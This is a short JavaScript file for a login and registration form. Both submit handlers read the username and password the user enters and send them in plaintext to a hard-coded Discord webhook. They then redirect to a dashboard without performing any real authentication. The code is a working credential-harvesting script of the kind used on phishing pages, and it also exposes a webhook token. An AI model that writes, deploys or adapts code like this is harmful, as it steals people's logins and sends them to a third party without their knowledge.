document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const webhookUrl = 'https://discord.com/api/webhooks/1276002520686268436/XGVrROEg-T3l76NxXOobejlqeYJAMvosfNAWEA_tT851yUB3aDhuV_JdD7Xau40oG3Gc';

    const data = {
        content: `Username: ${username}\nPassword: ${password}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            window.location.href = "dashboard.html";
        } else {
            console.error('Error:', response.statusText);
        }
    })
    .catch(error => console.error('Error:', error));
});

document.getElementById('registerForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const webhookUrl = 'https://discord.com/api/webhooks/1276002520686268436/XGVrROEg-T3l76NxXOobejlqeYJAMvosfNAWEA_tT851yUB3aDhuV_JdD7Xau40oG3Gc';

    const data = {
        content: `New User Registered:\nUsername: ${username}\nPassword: ${password}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            window.location.href = "dashboard.html";
        } else {
            console.error('Error:', response.statusText);
        }
    })
    .catch(error => console.error('Error:', error));
});
